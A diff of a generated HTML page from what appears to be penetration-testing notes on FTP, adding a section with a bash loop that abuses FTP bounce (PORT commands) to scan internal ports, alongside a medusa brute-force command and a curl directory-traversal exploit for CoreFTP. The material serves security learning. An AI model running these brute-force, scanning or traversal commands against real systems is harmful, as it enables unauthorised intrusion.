@@ -25,7 +25,7 @@
       
       
       <link rel="icon" href="../img/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.4">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
@@ -12821,6 +12821,17 @@
     <span class="md-ellipsis">
       
         FTP Bounce Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-bounce-attack-for-scanning-internal-network" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP Bounce attack for scanning internal network
       
     </span>
   </a>
@@ -28528,6 +28539,17 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#ftp-bounce-attack-for-scanning-internal-network" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP Bounce attack for scanning internal network
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#coreftp-server-build-725-directory-traversal-authenticated" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -28651,7 +28673,6 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 
 
-<p>exi</p>
 <h1 id="21-ftp">21 ftp</h1>
 <p>The File Transfer Protocol (FTP) is a standard communication protocol used to transfer computer files from a server to a client on a computer network. FTP is built on a client–server model architecture using separate control and data connections between the client and the server. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as <code>HTTP</code> or <code>POP</code>.</p>
 <p>FTP users may authenticate themselves with a clear-text sign-in protocol, generally in the form of a username and password. However, they can connect anonymously if the server is configured to allow it. For secure transmission that protects the username and password and encrypts the content, FTP is often secured with SSL/TLS (FTPS) or replaced with SSH File Transfer Protocol (SFTP).</p>
@@ -28808,7 +28829,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-8-6">6</a></span>
 <span class="normal"><a href="#__codelineno-8-7">7</a></span>
 <span class="normal"><a href="#__codelineno-8-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c1"># Brute force FTP logging</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>medusa<span class="w"> </span>-u<span class="w"> </span>fiona<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-h<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-M<span class="w"> </span>ftpno<span class="w"> </span>se
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>medusa<span class="w"> </span>-u<span class="w"> </span>fiona<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-h<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-M<span class="w"> </span>ftpno<span class="w"> </span>
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="c1"># -u: username</span>
 </span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="c1"># -U: list of Usernames</span>
 </span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="c1"># -p: password</span>
@@ -28850,12 +28871,14 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>p2=179
 </span></code></pre></div></td></tr></table></div>
 <p>So final command would be:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>quote<span class="w"> </span>PORT<span class="w"> </span><span class="m">192</span>,168,45,230,21,179
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>quote<span class="w"> </span>PORT<span class="w"> </span><span class="m">192</span>,168,45,152,21,179
 </span></code></pre></div></td></tr></table></div>
 <ol>
 <li>Set a listener in your kali</li>
 </ol>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">5555</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">5555</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>quote<span class="w"> </span>PORT<span class="w"> </span><span class="m">192</span>,168,45,169,21,179
 </span></code></pre></div></td></tr></table></div>
 <ol>
 <li>Initiate a file transfer or command that sends data to the target. From the ftp connection</li>
@@ -28863,11 +28886,34 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>get filename
 </span></code></pre></div></td></tr></table></div>
 <p>This command requests a file from the FTP server, which is then sent to the specified target, exploiting the bounce capability.</p>
+<h3 id="ftp-bounce-attack-for-scanning-internal-network">FTP Bounce attack for scanning internal network</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-17-10">10</a></span>
+<span class="normal"><a href="#__codelineno-17-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="m">3389</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a><span class="nv">p1</span><span class="o">=</span><span class="k">$((</span><span class="nv">p</span><span class="o">/</span><span class="m">256</span><span class="k">))</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a><span class="nv">p2</span><span class="o">=</span><span class="k">$((</span><span class="nv">p</span><span class="o">%</span><span class="m">256</span><span class="k">))</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Scanning port </span><span class="nv">$p</span><span class="s2">&quot;</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a><span class="o">(</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;user anonymous anonymous&quot;</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;quote PORT 127,0,0,1,</span><span class="nv">$p1</span><span class="s2">,</span><span class="nv">$p2</span><span class="s2">&quot;</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ls&quot;</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;quit&quot;</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10"></a><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ftp<span class="w"> </span>-n<span class="w"> </span><span class="m">192</span>.168.112.145<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;150|425&quot;</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11"></a><span class="k">done</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="coreftp-server-build-725-directory-traversal-authenticated">CoreFTP Server build 725 - Directory Traversal (Authenticated)</h3>
 <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22836">CVE-2022-22836</a> |   <a href="https://www.exploit-db.com/exploits/50652">exploit</a></p>
 <p>Summary: This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. </p>
 <p>The <a href="https://www.exploit-db.com/exploits/50652">exploit</a> for this attack is relatively straightforward, based on a single <code>cURL</code> command.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
 </span></code></pre></div></td></tr></table></div>
 <p>We create a raw HTTP <code>PUT</code> request (<code>-X PUT</code>) with basic auth (<code>--basic -u &lt;username&gt;:&lt;password&gt;</code>), the path for the file (<code>--path-as-is https://&lt;IP&gt;/../../../../../whoops</code>), and its content (<code>--data-binary "PoC."</code>) with this command. Additionally, we specify the host header (<code>-H "Host: &lt;IP&gt;"</code>) with the IP address of our target system.</p>
 <h2 id="other-ftp-services">Other FTP services</h2>
@@ -28880,52 +28926,52 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p>
 <h4 id="basic-usage_1">Basic usage</h4>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-18-10">10</a></span>
-<span class="normal"><a href="#__codelineno-18-11">11</a></span>
-<span class="normal"><a href="#__codelineno-18-12">12</a></span>
-<span class="normal"><a href="#__codelineno-18-13">13</a></span>
-<span class="normal"><a href="#__codelineno-18-14">14</a></span>
-<span class="normal"><a href="#__codelineno-18-15">15</a></span>
-<span class="normal"><a href="#__codelineno-18-16">16</a></span>
-<span class="normal"><a href="#__codelineno-18-17">17</a></span>
-<span class="normal"><a href="#__codelineno-18-18">18</a></span>
-<span class="normal"><a href="#__codelineno-18-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a># Sets the remote host, and optionally the port, for file transfers.
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>connect
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a># Transfers a file or set of files from the remote host to the local host.
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>get
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a>
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a># Transfers a file or set of files from the local host onto the remote host
-</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>put
-</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a>
-</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a># Exits tftp
-</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a>quit
-</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a>
-</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13"></a># Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on
-</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14"></a>status
-</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15"></a>
-</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16"></a># Turns verbose mode, which displays additional information during file transfer, on or off.
-</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17"></a>verbose 
-</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18"></a>
-</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19"></a># Unlike the FTP client, TFTP does not have directory listing functionality.
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-19-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-19-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-19-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-19-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-19-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-19-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-19-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-19-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-19-10">10</a></span>
+<span class="normal"><a href="#__codelineno-19-11">11</a></span>
+<span class="normal"><a href="#__codelineno-19-12">12</a></span>
+<span class="normal"><a href="#__codelineno-19-13">13</a></span>
+<span class="normal"><a href="#__codelineno-19-14">14</a></span>
+<span class="normal"><a href="#__codelineno-19-15">15</a></span>
+<span class="normal"><a href="#__codelineno-19-16">16</a></span>
+<span class="normal"><a href="#__codelineno-19-17">17</a></span>
+<span class="normal"><a href="#__codelineno-19-18">18</a></span>
+<span class="normal"><a href="#__codelineno-19-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a># Sets the remote host, and optionally the port, for file transfers.
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>connect
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a># Transfers a file or set of files from the remote host to the local host.
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5"></a>get
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7"></a># Transfers a file or set of files from the local host onto the remote host
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8"></a>put
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9"></a>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10"></a># Exits tftp
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11"></a>quit
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12"></a>
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13"></a># Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14"></a>status
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15"></a>
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16"></a># Turns verbose mode, which displays additional information during file transfer, on or off.
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17"></a>verbose 
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18"></a>
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19"></a># Unlike the FTP client, TFTP does not have directory listing functionality.
 </span></code></pre></div></td></tr></table></div>
 <h3 id="vsftpd">vsFTPd</h3>
 <p>One of the most used FTP servers on Linux-based distributions is <a href="https://security.appspot.com/vsftpd.html">vsFTPd</a>. </p>
 <h4 id="installation_1">Installation</h4>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="go">sudo apt install vsftpd </span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="go">sudo apt install vsftpd </span>
 </span></code></pre></div></td></tr></table></div>
 <h4 id="configuration-file">Configuration file</h4>
 <p>The default configuration of vsFTPd can be found in <code>/etc/vsftpd.conf</code>.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>cat /etc/vsftpd.conf | grep -v &quot;#&quot;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>cat /etc/vsftpd.conf | grep -v &quot;#&quot;
 </span></code></pre></div></td></tr></table></div>
 <table>
 <thead>
@@ -28990,7 +29036,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </tbody>
 </table>
 <p>In addition, there is a file called <code>/etc/ftpusers</code> that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. </p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>cat /etc/ftpusers
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>cat /etc/ftpusers
 </span></code></pre></div></td></tr></table></div>
 <p>Dangerous settings:</p>
 <table>
@@ -29030,7 +29076,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 7, 2026 21:02:17 UTC"><span class="timeago" datetime="2026-03-07T21:02:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 7, 2026 21:02:17 UTC">2026-03-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 20, 2026 15:28:12 UTC"><span class="timeago" datetime="2026-03-20T15:28:12+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 20, 2026 15:28:12 UTC">2026-03-20</span></small></br>
 
 
     <small>Created: January 1, 2023 21:59:36</small>
